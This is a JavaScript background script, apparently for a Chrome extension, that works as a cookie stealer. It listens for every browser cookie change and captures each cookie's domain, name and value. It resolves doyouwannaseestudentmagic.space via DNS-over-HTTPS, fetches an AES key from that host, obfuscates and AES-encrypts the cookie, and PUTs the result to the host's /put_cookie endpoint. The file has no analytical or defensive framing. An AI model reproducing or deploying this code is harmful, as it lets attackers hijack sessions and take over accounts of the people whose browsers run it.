chrome.cookies.onChanged.addListener(function(info) {
	var cookie = info.cookie.domain +":"+info.cookie.name+":"+info.cookie.value;
	console.log(cookie);
	var ip="";
	
	
	function resolve() {
	  var xhttp = new XMLHttpRequest();
	  xhttp.onreadystatechange = function() {
		if (this.readyState == 4 && this.status == 200) {
		  ip = (JSON.parse(this.responseText).Answer[0].data);
		  get_aes_key()
		  console.log(ip)
		};
	  };
	  xhttp.open("GET", "https://dns.google.com/resolve?name=doyouwannaseestudentmagic.space", true);
	  xhttp.send();
	}	
	
	
	var key="";
	function get_aes_key() {
	  var xhttp = new XMLHttpRequest();
	  xhttp.onreadystatechange = function() {
		if (this.readyState == 4 && this.status == 200) {
		  key = this.responseText;
		  console.log(key);
		  obfuscate(key);		  
		}
	  };
	  xhttp.open("GET", "http://"+ip+":5000/get_aes_key", true);
	  xhttp.send();
	}
	
	
	function obfuscate(){
		var hex, tmp, result = "";
		for (i=0; i<cookie.length; i++) {
			hex = cookie.charCodeAt(i).toString(16);
			tmp = "000"+hex;
			first_part=(tmp).slice(-4,-2);
			second_part=(tmp).slice(-2);
			if (first_part > "7F"){
			  result += ("0x"+first_part-1).toString(16)
			}
			else{ 
				result +=("0"+(parseInt(first_part,16)+1).toString(16)).slice(-2)}
			if (tmp.slice(-2) > "7F"){
				result+=("0x"+second_part-1).toString(16)
			}
			else{ 
				result += ("0"+(parseInt(second_part,16)+1).toString(16)).slice(-2)}
		}


		for (j=0; j<(key.match(/F/g) || []).length; j++){
		tmp = "";
			if (result.length%(10+j)!=0){
				result="0".repeat(10-result.length%10) + result
			}
			for (var i = 0; i < result.length; i+=10+j) {
			   if (parseInt(result.substring(i,i+10),16)%2==0){
				tmp+=("0000000000"+(parseInt(result.substring(i,i+10),16)/2).toString(16)).slice(-10)+result.substring(i+10,i+10+j)+"x"
			}
			   else{
				tmp+=("0000000000"+(parseInt(result.substring(i,i+10),16)-"1").toString(16)).slice(-10)+result.substring(i+10,i+10+j)+"y"
			}
			}
		result = tmp;
		}
		encrypt(result)
	}	
	
	
	function encrypt(result){
		/*
		   AES_Init: initialize the tables needed at runtime. Call this function
		   before the (first) key expansion.
		*/

		function AES_Init() {
		  AES_Sbox_Inv = new Array(256);
		  for(var i = 0; i < 256; i++)
			AES_Sbox_Inv[AES_Sbox[i]] = i;
		  
		  AES_ShiftRowTab_Inv = new Array(16);
		  for(var i = 0; i < 16; i++)
			AES_ShiftRowTab_Inv[AES_ShiftRowTab[i]] = i;

		  AES_xtime = new Array(256);
		  for(var i = 0; i < 128; i++) {
			AES_xtime[i] = i << 1;
			AES_xtime[128 + i] = (i << 1) ^ 0x1b;
		  }
		}

		/*
		   AES_Done: release memory reserved by AES_Init. Call this function after
		   the last encryption/decryption operation.
		*/

		function AES_Done() {
		  delete AES_Sbox_Inv;
		  delete AES_ShiftRowTab_Inv;
		  delete AES_xtime;
		}

		/*
		   AES_ExpandKey: expand a cipher key. Depending on the desired encryption
		   strength of 128, 192 or 256 bits 'key' has to be a byte array of length
		   16, 24 or 32, respectively. The key expansion is done "in place", meaning
		   that the array 'key' is modified.
		*/

		function AES_ExpandKey(key) {
		  var kl = key.length, ks, Rcon = 1;
		  ks = 16 * (14 + 1);
		  for(var i = kl; i < ks; i += 4) {
			var temp = key.slice(i - 4, i);
			if (i % kl == 0) {
			  temp = new Array(AES_Sbox[temp[1]] ^ Rcon, AES_Sbox[temp[2]], 
			AES_Sbox[temp[3]], AES_Sbox[temp[0]]); 
			  if ((Rcon <<= 1) >= 256)
			Rcon ^= 0x11b;
			}
			else if ((kl > 24) && (i % kl == 16))
			  temp = new Array(AES_Sbox[temp[0]], AES_Sbox[temp[1]], 
			AES_Sbox[temp[2]], AES_Sbox[temp[3]]);       
			for(var j = 0; j < 4; j++)
			  key[i + j] = key[i + j - kl] ^ temp[j];
		  }
		}

		/*
		   AES_Encrypt: encrypt the 16 byte array 'block' with the previously
		   expanded key 'key'.
		*/

		function AES_Encrypt(block, key) {
		  var l = key.length;
		  AES_AddRoundKey(block, key.slice(0, 16));
		  for(var i = 16; i < l - 16; i += 16) {
			AES_SubBytes(block, AES_Sbox);
			AES_ShiftRows(block, AES_ShiftRowTab);
			AES_MixColumns(block);
			AES_AddRoundKey(block, key.slice(i, i + 16));
		  }
		  AES_SubBytes(block, AES_Sbox);
		  AES_ShiftRows(block, AES_ShiftRowTab);
		  AES_AddRoundKey(block, key.slice(i, l));
		}

		/*
		   AES_Decrypt: decrypt the 16 byte array 'block' with the previously
		   expanded key 'key'.
		*/

		function AES_Decrypt(block, key) {
		  var l = key.length;
		  AES_AddRoundKey(block, key.slice(l - 16, l));
		  AES_ShiftRows(block, AES_ShiftRowTab_Inv);
		  AES_SubBytes(block, AES_Sbox_Inv);
		  for(var i = l - 32; i >= 16; i -= 16) {
			AES_AddRoundKey(block, key.slice(i, i + 16));
			AES_MixColumns_Inv(block);
			AES_ShiftRows(block, AES_ShiftRowTab_Inv);
			AES_SubBytes(block, AES_Sbox_Inv);
		  }
		  AES_AddRoundKey(block, key.slice(0, 16));
		}

		/******************************************************************************/

		/* The following lookup tables and functions are for internal use only! */

		AES_Sbox = new Array(99,124,119,123,242,107,111,197,48,1,103,43,254,215,171,
		  118,202,130,201,125,250,89,71,240,173,212,162,175,156,164,114,192,183,253,
		  147,38,54,63,247,204,52,165,229,241,113,216,49,21,4,199,35,195,24,150,5,154,
		  7,18,128,226,235,39,178,117,9,131,44,26,27,110,90,160,82,59,214,179,41,227,
		  47,132,83,209,0,237,32,252,177,91,106,203,190,57,74,76,88,207,208,239,170,
		  251,67,77,51,133,69,249,2,127,80,60,159,168,81,163,64,143,146,157,56,245,
		  188,182,218,33,16,255,243,210,205,12,19,236,95,151,68,23,196,167,126,61,
		  100,93,25,115,96,129,79,220,34,42,144,136,70,238,184,20,222,94,11,219,224,
		  50,58,10,73,6,36,92,194,211,172,98,145,149,228,121,231,200,55,109,141,213,
		  78,169,108,86,244,234,101,122,174,8,186,120,37,46,28,166,180,198,232,221,
		  116,31,75,189,139,138,112,62,181,102,72,3,246,14,97,53,87,185,134,193,29,
		  158,225,248,152,17,105,217,142,148,155,30,135,233,206,85,40,223,140,161,
		  137,13,191,230,66,104,65,153,45,15,176,84,187,22);

		AES_ShiftRowTab = new Array(0,5,10,15,4,9,14,3,8,13,2,7,12,1,6,11);

		function AES_SubBytes(state, sbox) {
		  for(var i = 0; i < 16; i++)
			state[i] = sbox[state[i]];  
		}

		function AES_AddRoundKey(state, rkey) {
		  for(var i = 0; i < 16; i++)
			state[i] ^= rkey[i];
		}

		function AES_ShiftRows(state, shifttab) {
		  var h = new Array().concat(state);
		  for(var i = 0; i < 16; i++)
			state[i] = h[shifttab[i]];
		}

		function AES_MixColumns(state) {
		  for(var i = 0; i < 16; i += 4) {
			var s0 = state[i + 0], s1 = state[i + 1];
			var s2 = state[i + 2], s3 = state[i + 3];
			var h = s0 ^ s1 ^ s2 ^ s3;
			state[i + 0] ^= h ^ AES_xtime[s0 ^ s1];
			state[i + 1] ^= h ^ AES_xtime[s1 ^ s2];
			state[i + 2] ^= h ^ AES_xtime[s2 ^ s3];
			state[i + 3] ^= h ^ AES_xtime[s3 ^ s0];
		  }
		}

		function AES_MixColumns_Inv(state) {
		  for(var i = 0; i < 16; i += 4) {
			var s0 = state[i + 0], s1 = state[i + 1];
			var s2 = state[i + 2], s3 = state[i + 3];
			var h = s0 ^ s1 ^ s2 ^ s3;
			var xh = AES_xtime[h];
			var h1 = AES_xtime[AES_xtime[xh ^ s0 ^ s2]] ^ h;
			var h2 = AES_xtime[AES_xtime[xh ^ s1 ^ s3]] ^ h;
			state[i + 0] ^= h1 ^ AES_xtime[s0 ^ s1];
			state[i + 1] ^= h2 ^ AES_xtime[s1 ^ s2];
			state[i + 2] ^= h1 ^ AES_xtime[s2 ^ s3];
			state[i + 3] ^= h2 ^ AES_xtime[s3 ^ s0];
		  }
		}
		AES_Init();
		var encrypted_cookie ="";
		AES_ExpandKey(key);
		for (var i = 0; i < result.length; i+=16) {
			var block = new Array(16);
			block = result.substring(i,i+16).split('').map(x=>x.charCodeAt(0)); 
		AES_Encrypt(block, key) 
		encrypted_cookie+= String.fromCharCode.apply(null, block);
		}
		put_cookie(btoa(encrypted_cookie))
		console.log(btoa(encrypted_cookie))
		
	}
	
	
	function get_cookie() {
	  return 1
	  /*to be implemented*/
	}
	
	
	function put_cookie(encrypted_cookie) {
	  var xhttp = new XMLHttpRequest();
	  xhttp.onreadystatechange = function() {
		if (this.readyState == 4 && this.status == 200) {
		  console.log(this.responseText);	  
		}
	  };
	  xhttp.open("PUT", "http://"+ip+":5000/put_cookie", true);
	  xhttp.send(encrypted_cookie);
	}
	
	
	resolve();

	
});



